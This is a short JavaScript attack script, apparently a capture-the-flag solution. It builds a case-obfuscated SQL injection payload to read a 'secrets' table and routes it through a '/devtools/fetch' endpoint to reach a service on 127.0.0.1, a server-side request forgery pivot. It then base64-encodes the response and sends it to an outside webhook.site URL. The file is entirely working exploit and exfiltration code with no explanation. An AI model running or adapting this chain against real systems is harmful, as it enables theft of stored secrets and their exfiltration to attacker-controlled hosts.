// Build the SQL injection payload
const sqlPayload = "' UnIoN SeLeCt 1,secret,3,4 FrOm secrets WheRe '1'='1";

// Construct URL with proper encoding
const url = "http://127.0.0.1:8080/search?q=" + encodeURIComponent(sqlPayload);

fetch('/devtools/fetch', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: url})
})
.then(r => r.json())
.then(d => {
  fetch('https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?flag=' + btoa(d.body));
});
